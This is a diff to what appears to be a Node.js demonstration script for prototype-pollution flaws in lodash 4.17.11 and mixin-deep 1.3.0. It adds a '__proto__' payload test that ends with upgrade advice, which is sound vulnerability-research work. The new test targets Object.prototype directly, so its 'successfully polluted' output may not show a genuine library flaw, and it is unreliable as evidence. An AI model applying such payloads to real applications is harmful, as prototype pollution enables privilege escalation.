@@ -14,7 +14,8 @@ function checkPrototypePollution() {
         isAdmin: testObj.isAdmin,
         polluted: testObj.polluted,
         isHacked: testObj.isHacked,
-        hasPollution: 'isAdmin' in testObj || 'polluted' in testObj || 'isHacked' in testObj
+        isVulnerable: testObj.isVulnerable,
+        hasPollution: 'isAdmin' in testObj || 'polluted' in testObj || 'isHacked' in testObj || 'isVulnerable' in testObj
     };
 }
 
@@ -22,6 +23,7 @@ function cleanPrototype() {
     if (Object.prototype.isAdmin !== undefined) delete Object.prototype.isAdmin;
     if (Object.prototype.polluted !== undefined) delete Object.prototype.polluted;
     if (Object.prototype.isHacked !== undefined) delete Object.prototype.isHacked;
+    if (Object.prototype.isVulnerable !== undefined) delete Object.prototype.isVulnerable;
 }
 
 console.log('Initial state:');
@@ -129,6 +131,42 @@ if (checkPrototypePollution().hasPollution) {
 }
 console.log();
 
+// Clean up for next test
+cleanPrototype();
+
+// Transitive dependency vulnerability: mixin-deep via webpack dependency chain
+console.log('5. Testing Transitive Dependency: mixin-deep vulnerability:');
+console.log('Dependency chain: webpack -> micromatch -> snapdragon -> base -> mixin-deep@1.3.0');
+
+// Access mixin-deep through the transitive dependency chain
+const mixinDeep = require('mixin-deep');
+
+console.log('mixin-deep version:', require('mixin-deep/package.json').version);
+console.log('Payload: {"__proto__": {"isVulnerable": "mixin-deep"}}');
+
+const payload5 = {
+    __proto__: {
+        isVulnerable: 'mixin-deep'
+    }
+};
+
+// For mixin-deep to pollute the global prototype, we need to use Object.prototype as target
+const result5 = mixinDeep(Object.prototype, payload5);
+
+console.log('Result:', result5);
+console.log('Prototype pollution check:', checkPrototypePollution());
+
+// Check specifically for the mixin-deep pollution
+const testObj5 = {};
+if ('isVulnerable' in testObj5) {
+    console.log('✅ Prototype successfully polluted via transitive mixin-deep dependency!');
+    console.log('Value of testObj5.isVulnerable:', testObj5.isVulnerable);
+} else {
+    console.log('❌ mixin-deep pollution failed');
+}
+console.log();
+
 console.log('🎯 Vulnerability demonstration complete!');
-console.log('defaultsDeep is clearly vulnerable in lodash 4.17.11');
-console.log('Upgrade to lodash 4.17.21 or later to fix these vulnerabilities.');
+console.log('- defaultsDeep is clearly vulnerable in lodash 4.17.11');
+console.log('- mixin-deep@1.3.0 is vulnerable via transitive dependency through webpack');
+console.log('Upgrade to lodash 4.17.21+ and ensure mixin-deep 1.3.1+ to fix these vulnerabilities.');
